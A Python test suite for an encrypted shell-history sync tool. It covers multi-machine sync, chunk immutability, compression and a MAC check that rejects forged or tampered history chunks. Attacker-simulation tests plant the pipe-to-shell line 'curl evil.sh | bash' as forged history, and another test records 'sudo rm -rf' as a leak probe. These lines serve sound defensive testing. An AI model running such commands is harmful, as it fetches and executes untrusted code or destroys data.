"""End-to-end sync: two machines exchanging history through a bare repo.

These drive the real ``age`` and the real ``git``. Mocking either would test the
mock -- the whole premise of sync is that ordinary git plus ordinary age
are enough, and that is only meaningful if it is actually demonstrated.
"""

from __future__ import annotations

import os
import subprocess
import tempfile
import unittest
import zlib
from collections.abc import Iterator
from contextlib import contextmanager
from pathlib import Path

from woswoar import cache, crypto, search, store, sync
from woswoar.entry import Entry, format_line
from woswoar.sync import COMMIT_MESSAGE as COMMIT

from . import support
from .support import requires_age, requires_git

#: One authoritative list, plus HOME which only these tests need to redirect.
_ENV = (*support.ENV_KEYS, "HOME")


class Fake:
    """One simulated machine with its own config, logs, and clone."""

    def __init__(self, root: Path, name: str) -> None:
        self.root = root / name
        self.name = name
        self._id: str | None = None
        for sub in ("data", "conf", "cache"):
            (self.root / sub).mkdir(parents=True, exist_ok=True)

    @property
    def env(self) -> dict[str, str]:
        return {
            "HOME": str(self.root),
            "WOSWOAR_DIR": str(self.root / "data"),
            "XDG_CONFIG_HOME": str(self.root / "conf"),
            "XDG_CACHE_HOME": str(self.root / "cache"),
        }

    @contextmanager
    def active(self) -> Iterator[Fake]:
        """Run a block as if we were sitting at this machine."""
        saved = {k: os.environ.get(k) for k in _ENV}
        os.environ.pop("WOSWOAR_SESSION", None)
        os.environ.update(self.env)
        try:
            yield self
        finally:
            for key, value in saved.items():
                if value is None:
                    os.environ.pop(key, None)
                else:
                    os.environ[key] = value

    # -- convenience, all assuming `active()` is held ----------------------

    @property
    def id(self) -> str:
        """This machine's id, resolved once and remembered.

        Deliberately cached: store.machine() reads the *ambient* environment, so
        a live lookup would quietly return the wrong machine's id whenever one
        Fake is inspected while another is active -- which is most assertions in
        a two-machine test.
        """
        if self._id is None:
            self._id = store.machine().id
        return self._id

    def record(self, day: str, ts: int, cmd: str, session: str = "s1") -> None:
        """Append a line the way the shell hook would."""
        path = store.log_file(self.id, day)
        path.parent.mkdir(parents=True, exist_ok=True)
        entry = Entry(ts, self.id, session, "~/src", 0, 5, cmd)
        with path.open("a", encoding="utf-8") as handle:
            handle.write(format_line(entry) + "\n")

    def commands(self) -> set[str]:
        return {e.cmd for e in cache.load_entries()}


@requires_age
@requires_git
class SyncTestCase(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory(prefix="woswoar-sync-")
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name)

        self.origin = self.root / "origin.git"
        subprocess.run(
            ["git", "init", "--quiet", "--bare", str(self.origin)], check=True, timeout=60
        )

    def machine(self, name: str, enrol: bool = True, display: str | None = None) -> Fake:
        fake = Fake(self.root, name)
        if enrol:
            with fake.active():
                if display:
                    # Set before init: name.age is sealed during enrolment.
                    store.save_machine(store.machine()._replace(name=display))
                # A dedicated identity, not the developer's real SSH key.
                sync.initialise(remote=str(self.origin), new_identity=True)
                _ = fake.id  # resolve while this machine's env is in effect
        return fake

    def git_in_repo(self, fake: Fake, *args: str) -> str:
        with fake.active():
            return sync.git(*args)


class TestSingleMachine(SyncTestCase):
    def test_export_seals_and_pushes(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            report = sync.run()
            self.assertEqual(report.chunks_written, 1)
            self.assertEqual(report.lines_exported, 1)
            self.assertTrue(report.pushed)

    def test_nothing_new_writes_no_chunk(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            again = sync.run()
            self.assertEqual(again.chunks_written, 0)
            self.assertEqual(again.lines_exported, 0)

    def test_nothing_readable_leaks_into_the_repo(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "sudo rm -rf /very-secret-path")
            sync.run()
            blob = b"".join(p.read_bytes() for p in store.history_dir().rglob("*") if p.is_file())
        self.assertNotIn(b"very-secret-path", blob)
        self.assertNotIn(b"sudo", blob)

    def test_partial_final_line_is_not_sealed_until_complete(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            path = store.log_file(alpha.id, "2023-11-14")
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text("1700000001\ts1\t~/src\t0\t5\tcomplete\n1700000002\ts1", "utf-8")

            sync.run()
            state = sync.State.load()
            relpath = f"hosts/{alpha.id}/2023-11-14.tsv"
            # The watermark stops at the last newline, so the half-written record
            # is left for next time rather than sealed into an immutable chunk.
            self.assertEqual(state.exported[relpath], path.stat().st_size - len("1700000002\ts1"))


class TestTwoMachines(SyncTestCase):
    def test_history_reaches_the_other_machine(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            alpha.record("2023-11-14", 1_700_000_002, "make -j8")
            sync.run()

        beta = self.machine("beta")
        with beta.active():
            sync.run()
        # beta joined after alpha sealed those lines, so it cannot read them yet.
        # One command on an already-enrolled machine is the whole fix, exactly
        # as documented -- no surrounding sync to fetch beta's key or publish.
        with alpha.active():
            sync.grant()
        with beta.active():
            report = sync.run()
            self.assertEqual(report.chunks_merged, 1)
            self.assertEqual(beta.commands(), {"git status", "make -j8"})

    def test_reencrypt_alone_grants_access_without_a_surrounding_sync(self) -> None:
        """The recipient list is a file in the working tree.

        Re-sealing against a checkout taken before the new machine enrolled
        rewrites every key to the *old* recipients and reports full success,
        while granting nothing. So `reencrypt` has to fetch first, and this
        pins that it does -- alpha never syncs after beta joins.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

        beta = self.machine("beta")  # init publishes beta's public key
        with alpha.active():
            report = sync.grant()
            self.assertTrue(report.pushed)
            self.assertEqual(report.skipped, 0)
            self.assertGreater(report.resealed, 0)

        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"git status"})

    def test_a_new_machine_cannot_reencrypt_for_itself(self) -> None:
        """Re-sealing means opening the key first, which beta cannot do.

        This is the property the encryption rests on, not a missing feature:
        a machine nobody granted access to must not be able to grant itself
        access. It must say so rather than report a successful no-op.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

        beta = self.machine("beta")
        with beta.active():
            sync.run()
            report = sync.grant()
            # It re-seals what it owns -- its own name seal -- and skips both
            # alpha's day key and the repo key, so it still cannot read
            # anything, and above all cannot authorise itself to.
            self.assertGreater(report.skipped, 0)
            self.assertTrue(sync.run().needs_grant)
            self.assertEqual(beta.commands(), set())

    def test_a_machine_waiting_for_grant_reports_and_loses_nothing(self) -> None:
        """The state between `init` and `grant`, which is normal, not an error.

        A machine that has not been granted access holds no repo key, so it can
        neither authenticate what others wrote nor tag what it writes. That is
        reported rather than raised -- the timer fires every minute -- and the
        backlog it recorded meanwhile is published *in full* by the first sync
        after `grant`, which is the property that makes waiting safe.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

        beta = self.machine("beta")
        with beta.active():
            beta.record("2023-11-15", 1_700_100_000, "beta's own command")
            report = sync.run()
            self.assertTrue(report.needs_grant)
            self.assertEqual(report.lines_exported, 0)
            self.assertEqual(beta.commands(), {"beta's own command"})  # recorded locally

        with alpha.active():
            sync.grant()

        with beta.active():
            report = sync.run()
            self.assertFalse(report.needs_grant)
            self.assertEqual(report.lines_exported, 1, "the backlog was not published")
            self.assertEqual(beta.commands(), {"git status", "beta's own command"})

    def test_bidirectional(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "from alpha")
            sync.run()
            sync.grant()
        with beta.active():
            beta.record("2023-11-14", 1_700_000_050, "from beta")
            sync.run()
        with alpha.active():
            sync.run()
            self.assertEqual(alpha.commands(), {"from alpha", "from beta"})
        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"from alpha", "from beta"})

    def test_merging_is_idempotent(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            sync.grant()
        with beta.active():
            sync.run()
            first = len(cache.load_entries())
            for _ in range(3):
                sync.run()
            self.assertEqual(len(cache.load_entries()), first, "re-sync duplicated entries")

    def test_offline_backlog_spanning_days(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            sync.run()
            sync.grant()
        with beta.active():
            sync.run()

        with alpha.active():
            for day, ts in (("2023-11-14", 1_700_000_001), ("2023-11-15", 1_700_100_000)):
                alpha.record(day, ts, f"command on {day}")
            # One sync after several days offline: a chunk per day, because a
            # chunk always belongs to exactly one day file.
            report = sync.run()
            self.assertEqual(report.chunks_written, 2)

        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"command on 2023-11-14", "command on 2023-11-15"})

    def test_other_machines_name_is_learned(self) -> None:
        alpha = self.machine("alpha", display="alpha@laptop")
        beta = self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            sync.grant()
        with beta.active():
            sync.run()
            # Without this, search would label alpha's entries with its opaque id.
            self.assertEqual(store.host_names().get(alpha.id), "alpha@laptop")

    def test_search_spans_hosts_but_host_scope_does_not(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "from alpha")
            sync.run()
            sync.grant()
        with beta.active():
            beta.record("2023-11-14", 1_700_000_050, "from beta")
            sync.run()
            entries = cache.load_entries()
            self.assertEqual(len(search.filter_scope(entries, "global")), 2)
            self.assertEqual([e.cmd for e in search.filter_scope(entries, "host")], ["from beta"])


class TestImmutability(SyncTestCase):
    """The invariant the whole storage design rests on."""

    def test_no_chunk_is_ever_modified_or_deleted(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")

        with alpha.active():
            for i in range(4):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"alpha {i}")
                sync.run()
            sync.grant()
        with beta.active():
            for i in range(3):
                beta.record("2023-11-15", 1_700_100_000 + i, f"beta {i}")
                sync.run()
        with alpha.active():
            sync.run()

        # Exact, not a heuristic: if any commit ever modified or deleted a
        # chunk, this lists it. An empty result is the guarantee that repo
        # growth equals the bytes written.
        touched = self.git_in_repo(
            alpha,
            "log",
            "--all",
            "--diff-filter=MD",
            "--name-only",
            "--pretty=format:",
            "--",
            "hosts",
        )
        rewritten = {line for line in touched.splitlines() if line.endswith(".age")}

        # Chunks live under hosts/<id>/YYYY-MM-DD/. Key files and name seals sit
        # elsewhere in the tree and *are* rewritten, by design: that is exactly
        # what makes onboarding cheap. Separating the two here keeps the
        # exception explicit rather than quietly widening the invariant.
        # Classified by store, not by a regex copied here: a hand-maintained
        # pattern would silently stop matching if the layout ever changed,
        # leaving this assertion vacuously true while real chunks were rewritten.
        chunks = {p for p in rewritten if store.is_chunk_path(p)}
        self.assertEqual(sorted(chunks), [], f"chunks were rewritten: {sorted(chunks)}")

        # And the only things that were rewritten are the ones allowed to be.
        self.assertTrue(
            all(("/keys/" in p or p.endswith("/name.age")) for p in rewritten),
            f"unexpected rewrites: {sorted(rewritten - chunks)}",
        )

    def test_repo_growth_tracks_bytes_written_not_sync_count(self) -> None:
        syncs = 20
        alpha = self.machine("alpha")
        with alpha.active():
            for i in range(syncs):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command number {i}")
                sync.run()

            self.git_in_repo(alpha, "gc", "--quiet")
            # git's own reported object size. Summing files under .git would
            # instead measure the sample hooks, which dwarf a repo this small.
            counts = dict(
                line.split(": ", 1)
                for line in self.git_in_repo(alpha, "count-objects", "-v").splitlines()
                if ": " in line
            )
            stored = int(counts["size-pack"]) * 1024 + int(counts["size"]) * 1024
            chunk_bytes = sum(c.path.stat().st_size for c in store.iter_chunks(alpha.id))
            chunks = len(list(store.iter_chunks(alpha.id)))

        self.assertEqual(chunks, syncs, "each sync must produce exactly one chunk")
        # Chunks are written once and never rewritten, so git stores each
        # exactly once: total objects stay close to the bytes actually written.
        # Re-encrypting the whole day file each sync would instead store
        # 1+2+...+N copies and blow straight past this.
        self.assertLess(
            stored,
            chunk_bytes * 4 + 64 * 1024,
            f"stored={stored} chunk_bytes={chunk_bytes} over {syncs} syncs",
        )


class TestChunkPayload(unittest.TestCase):
    """The chunk encoding, without needing age or git."""

    def test_round_trip(self) -> None:
        for data in (b"", b"x", b"a line\n", b"repeated line\n" * 500, bytes(range(256))):
            self.assertEqual(sync.unpack(sync.pack(data)), data)

    def test_repetitive_input_shrinks(self) -> None:
        # Shell history is repetitive by nature, and this is the one moment it
        # can be compressed: once sealed, ciphertext is incompressible forever.
        data = b"1700000000\ts1\t~/src\t0\t5\tgit status\n" * 200
        self.assertLess(len(sync.pack(data)), len(data) // 10)

    def test_a_tiny_chunk_costs_only_a_few_bytes(self) -> None:
        """Deflate has a floor, and one very short line can land above it.

        This is what `pack` used to avoid by tagging each payload raw-or-
        deflated and keeping the smaller. It was not worth it: the tag cost a
        byte on every chunk that *did* compress, which is all but the shortest,
        and the worst case it bought back is the handful of bytes below --
        against a sealed chunk that already carries a 200-byte age header.
        """
        data = b"1700000000\ts1\t~\t0\t5\tls\n"
        self.assertLess(len(sync.pack(data)) - len(data), 8)

    def test_a_payload_we_cannot_read_is_refused(self) -> None:
        # Loudly, rather than decoding into garbage that then gets appended to
        # a log file and cached. `_merge_host` turns this into an unreadable
        # chunk rather than letting it abort the sync.
        for blob in (b"\x7fanything", b"", b"1700000000\ts1\t~\t0\t5\tls\n"):
            with self.assertRaises(zlib.error):
                sync.unpack(blob)


class TestGrantConfirmation(SyncTestCase):
    """`grant` widens who can read everything, so it says so and asks first."""

    def test_readers_are_labelled_for_a_human(self) -> None:
        # `age1ejf3l4f0nhnp9...` is not something anyone can consent to.
        alpha = self.machine("alpha", display="martinus@box")
        with alpha.active():
            labels = dict((label, key) for key, label in sync.reader_labels())
        self.assertIn("martinus@box", labels)

    def test_an_unlabelled_key_still_gets_a_readable_handle(self) -> None:
        # recipients.txt written by an older woswoar, or hand-edited.
        alpha = self.machine("alpha")
        with alpha.active():
            path = store.recipients_file()
            path.write_text("age1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqwwwwww\n", encoding="utf-8")
            ((key, label),) = sync.reader_labels()
            self.assertTrue(label)
            self.assertNotIn(sync._LABEL_SEP, key)

    def test_a_key_listed_twice_is_offered_to_age_once(self) -> None:
        """`recipients.txt` is `merge=union`.

        Two machines appending the same key, one labelled and one not, leaves
        both lines -- and age rejects a repeated recipient.
        """
        alpha = self.machine("alpha", display="box")
        with alpha.active():
            key = sync.recipients()[0]
            path = store.recipients_file()
            path.write_text(f"{key}\n{key}{sync._LABEL_SEP}box\n", encoding="utf-8")
            self.assertEqual(sync.recipients(), [key])
            # And it is still usable, which is the point of deduplicating.
            crypto.encrypt_to_recipients(b"x", sync.recipients())

    def test_granting_refuses_if_the_machines_changed_while_deciding(self) -> None:
        """A confirmation that can under-report what it authorises is worse
        than none, so the approved list is checked against the fetched one."""
        alpha = self.machine("alpha")
        with alpha.active():
            approved = sync.readers()
        self.machine("beta")  # enrols behind alpha's back

        with alpha.active(), self.assertRaises(sync.SyncError) as caught:
            sync.grant(confirmed=approved)
        self.assertIn("changed while you were deciding", str(caught.exception))

    def test_granting_with_the_approved_list_goes_ahead(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            report = sync.grant(confirmed=sync.readers())
            self.assertGreater(report.resealed, 0)


class TestChunkNaming(support.WoswoarTestCase):
    def test_many_chunks_in_one_second_all_get_distinct_paths(self) -> None:
        """Overwriting a sealed chunk would destroy committed history.

        The name is `<epoch seconds>-<random>`, so everything written inside one
        second is competing for the same random suffix. With four hex characters
        and no check, twenty chunks collided in ~0.3% of runs -- which showed up
        exactly once in CI, as one missing chunk.
        """
        made: set[Path] = set()
        store.chunk_dir("host", "2023-11-14").mkdir(parents=True, exist_ok=True)
        for _ in range(2000):
            path = store.new_chunk("host", "2023-11-14", 1_700_000_000)
            self.assertNotIn(path, made)
            made.add(path)
            path.write_bytes(b"x")  # only an existing file can be collided with


class TestLayout(SyncTestCase):
    def test_a_chunk_lives_one_directory_below_its_host(self) -> None:
        """`hosts/<id>/2023-11-14/<chunk>` -- the date is one path component.

        Every commit rewrites a tree object per level it touches, so nesting
        the date as `2023/11/14` costs two extra objects on every sync forever.
        Pinned because it is invisible in behaviour and easy to reintroduce.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            chunk = next(iter(store.iter_chunks(alpha.id)))
            relpath = chunk.path.relative_to(store.history_dir()).as_posix()

        self.assertEqual(relpath.split("/")[:3], ["hosts", alpha.id, "2023-11-14"])
        self.assertTrue(store.is_chunk_path(relpath), relpath)

    def test_sealed_history_is_smaller_than_the_plaintext_it_carries(self) -> None:
        """A day's worth of one machine's commands, compacted into one chunk.

        Without compression the sealed form is strictly *larger* than the
        plaintext -- age adds a header and encrypts. This asserts the whole
        point of packing the payload first, on input shaped like real history.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            # Two syncs, not sixty: `compact` only needs more than one chunk to
            # merge, and each extra sync is a fetch, a rebase, a push and an
            # `age` spawn for no additional coverage.
            for i in range(60):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"git commit -m 'feature {i % 7}'")
                if i == 29:
                    sync.run()
            sync.run()
            plaintext = store.log_file(alpha.id, "2023-11-14").stat().st_size
            sync.compact(before="2023-11-15")
            sealed = sum(c.path.stat().st_size for c in store.iter_chunks(alpha.id))

        self.assertLess(sealed, plaintext // 2, f"sealed={sealed} plaintext={plaintext}")


class TestCompact(SyncTestCase):
    def test_compact_merges_chunks_and_preserves_content(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            for i in range(5):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command {i}")
                sync.run()
            before = len(list(store.iter_chunks(alpha.id)))
            self.assertEqual(before, 5)

            days, replaced = sync.compact(before="2023-11-15")
            self.assertEqual((days, replaced), (1, 5))
            self.assertEqual(len(list(store.iter_chunks(alpha.id))), 1)

    def test_compacted_chunk_still_reaches_another_machine(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            for i in range(3):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command {i}")
                sync.run()
            sync.compact(before="2023-11-15")
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"command 0", "command 1", "command 2"})


class TestIdentityStatus(SyncTestCase):
    """The health check `doctor` reports. Testable because it lives in sync."""

    def test_healthy_identity(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            status = sync.identity_status(store.machine())
            self.assertTrue(status.ok, status.detail)

    def test_missing_identity_file_is_reported(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            known = store.machine()
            Path(known.identity).unlink()
            status = sync.identity_status(known)
            self.assertFalse(status.ok)
            self.assertIn("missing", status.detail)

    def test_unconfigured_identity_is_reported(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            status = sync.identity_status(store.machine()._replace(identity=""))
            self.assertFalse(status.ok)
            self.assertIn("woswoar init", status.detail)

    def test_passphrase_protected_key_is_reported(self) -> None:
        # The failure that only bites unattended: age cannot use ssh-agent, so
        # this key would work by hand and never from a systemd timer.
        alpha = self.machine("alpha")
        with alpha.active():
            locked = self.root / "locked"
            subprocess.run(
                ["ssh-keygen", "-q", "-t", "ed25519", "-N", "hunter2", "-f", str(locked)],
                check=True,
                timeout=60,
            )
            status = sync.identity_status(store.machine()._replace(identity=str(locked)))
            self.assertFalse(status.ok)
            self.assertIn("passphrase", status.detail)


class TestLocalOnly(SyncTestCase):
    def test_sync_without_a_remote_still_seals(self) -> None:
        alpha = Fake(self.root, "solo")
        with alpha.active():
            sync.initialise(new_identity=True)
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            report = sync.run()
            self.assertEqual(report.chunks_written, 1)
            self.assertFalse(report.pushed)

    def test_concurrent_sync_is_refused_not_corrupted(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active(), sync.lock(), self.assertRaises(sync.SyncError):
            sync.run()


if __name__ == "__main__":
    unittest.main()


class TestChunkAuthenticity(SyncTestCase):
    """Whether one of *this user's* machines wrote a chunk, which age cannot say.

    `recipients.txt` publishes every machine's public key and each day's public
    key sits in the clear beside its sealed half, so anyone who can push to the
    repo can seal a chunk every machine is able to *open*. These pin that being
    able to open it is not the same as being willing to believe it.
    """

    def push_as_attacker(self, write: object) -> None:
        """Do what push access alone allows: no identity, no keys, just the repo."""
        work = self.root / "attacker"
        if not work.exists():
            subprocess.run(
                ["git", "clone", "--quiet", str(self.origin), str(work)], check=True, timeout=60
            )
        else:
            subprocess.run(["git", "-C", str(work), "pull", "--quiet"], check=True, timeout=60)
        write(work)  # type: ignore[operator]
        for args in (
            ["add", "-A"],
            ["-c", "user.name=x", "-c", "user.email=x@y", "commit", "-q", "-m", COMMIT],
            ["push", "--quiet", "origin", "HEAD"],
        ):
            subprocess.run(["git", "-C", str(work), *args], check=True, timeout=60)

    @staticmethod
    def forged_chunk(work: Path, host_id: str, day: str, cmd: str) -> None:
        """A chunk sealed to a host's *published* day key, tagged by nobody."""
        pub = (work / "hosts" / host_id / "keys" / f"{day}.pub").read_text(encoding="utf-8").strip()
        entry = Entry(1_700_000_900, host_id, "s1", "~", 0, 5, cmd)
        payload = sync.pack((format_line(entry) + "\n").encode("utf-8"))
        # Named far in the future so it sorts above whatever the real machine
        # has published; a forgery the watermark skips proves nothing.
        target = work / "hosts" / host_id / day / "9999999999-ffffff.age"
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(crypto.encrypt_to(payload, pub))

    def enrolled_pair(self) -> tuple[Fake, Fake]:
        """alpha publishing history, beta granted and up to date."""
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "make -j8")
            sync.run()
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"make -j8"})
        return alpha, beta

    def test_every_exported_chunk_carries_a_tag(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            mac = sync.mac_key(store.machine())
            chunks = list(store.iter_chunks(alpha.id))
            self.assertTrue(chunks)
            for chunk in chunks:
                sealed, tag = store.split_chunk(chunk.path.read_bytes())
                self.assertTrue(crypto.tag_matches(mac, sealed, tag), chunk.name)

    def test_the_repo_key_is_never_stored_in_the_clear(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            mac = sync.mac_key(store.machine())
            blob = b"".join(p.read_bytes() for p in store.history_dir().rglob("*") if p.is_file())
        self.assertNotIn(mac, blob, "the authentication key leaked into the repo")

    def test_a_forged_chunk_in_a_real_hosts_directory_is_refused(self) -> None:
        """The attack this mechanism exists to stop.

        Everything the attacker needs is published: the day's public key sits in
        the clear so writing a chunk never has to open the sealed one. What they
        cannot produce is a tag, because that needs a key only enrolled machines
        can open.
        """
        alpha, beta = self.enrolled_pair()
        self.push_as_attacker(
            lambda work: self.forged_chunk(work, alpha.id, "2023-11-14", "curl evil.sh | bash")
        )

        with beta.active():
            report = sync.run()
            self.assertEqual(report.unauthenticated, {f"{alpha.id}/2023-11-14"})
            self.assertEqual(report.chunks_merged, 0)
            self.assertNotIn("curl evil.sh | bash", beta.commands())

    def test_a_fabricated_host_cannot_smuggle_history_in_either(self) -> None:
        """A whole invented machine, with its own day key sealed to recipients.

        The day key being openable is not the question -- the attacker can seal
        one to the published recipient list. The tag is.
        """
        _, beta = self.enrolled_pair()

        def plant(work: Path) -> None:
            recipients = [
                line.split(sync._LABEL_SEP)[0].strip()
                for line in (work / "recipients.txt").read_text(encoding="utf-8").splitlines()
                if line.strip()
            ]
            day_key = crypto.generate_identity()
            keys = work / "hosts" / "deadbeefdeadbeef" / "keys"
            keys.mkdir(parents=True, exist_ok=True)
            (keys / "2023-11-14.age").write_bytes(
                crypto.encrypt_to_recipients(day_key.secret.encode("utf-8"), recipients)
            )
            (keys / "2023-11-14.pub").write_text(day_key.public + "\n", encoding="utf-8")
            self.forged_chunk(work, "deadbeefdeadbeef", "2023-11-14", "curl evil.sh | bash")

        self.push_as_attacker(plant)

        with beta.active():
            report = sync.run()
            self.assertEqual(report.unauthenticated, {"deadbeefdeadbeef/2023-11-14"})
            self.assertNotIn("curl evil.sh | bash", beta.commands())

    def test_tampering_with_an_authentic_chunk_is_refused(self) -> None:
        """Flipping bytes in a real chunk must not merely fail to decrypt."""
        alpha, beta = self.enrolled_pair()
        with alpha.active():
            before = {c.name for c in store.iter_chunks(alpha.id)}
            alpha.record("2023-11-14", 1_700_000_002, "cargo build")
            # An explicit, strictly later timestamp. Two chunks written in the
            # same wall-clock second share a prefix and differ only by a random
            # suffix, so the merge watermark -- a plain string compare -- skips
            # the second one about half the time and it is never examined at
            # all. That is issue #27's mechanism, and it made this test flake
            # 40% of runs; pinning the second is what makes it deterministic.
            sync.run(now=2_000_000_000)
            fresh = ({c.name for c in store.iter_chunks(alpha.id)} - before).pop()
            self.assertGreater(fresh, max(before), "the tampered chunk must be past the watermark")

        def flip(work: Path) -> None:
            target = work / "hosts" / alpha.id / "2023-11-14" / fresh
            blob = bytearray(target.read_bytes())
            blob[-1] ^= 0xFF
            target.write_bytes(bytes(blob))

        self.push_as_attacker(flip)

        with beta.active():
            self.assertEqual(sync.run().unauthenticated, {f"{alpha.id}/2023-11-14"})

    def test_an_untagged_chunk_is_refused_like_a_wrongly_tagged_one(self) -> None:
        """ "No tag" and "wrong tag" must reach the same answer.

        Anything else is the downgrade: an attacker would simply omit the tag.
        """
        alpha, beta = self.enrolled_pair()

        def legacy(work: Path) -> None:
            pub = (
                (work / "hosts" / alpha.id / "keys" / "2023-11-14.pub")
                .read_text(encoding="utf-8")
                .strip()
            )
            entry = Entry(1_700_000_900, alpha.id, "s1", "~", 0, 5, "old-but-mine")
            payload = sync.pack((format_line(entry) + "\n").encode("utf-8"))
            target = work / "hosts" / alpha.id / "2023-11-14" / "9999999999-eeeeee.age"
            # No frame_chunk: exactly what an older woswoar wrote.
            target.write_bytes(crypto.encrypt_to(payload, pub))

        self.push_as_attacker(legacy)

        with beta.active():
            report = sync.run()
            self.assertEqual(report.unauthenticated, {f"{alpha.id}/2023-11-14"})
            self.assertNotIn("old-but-mine", beta.commands(), "unverified history was merged")
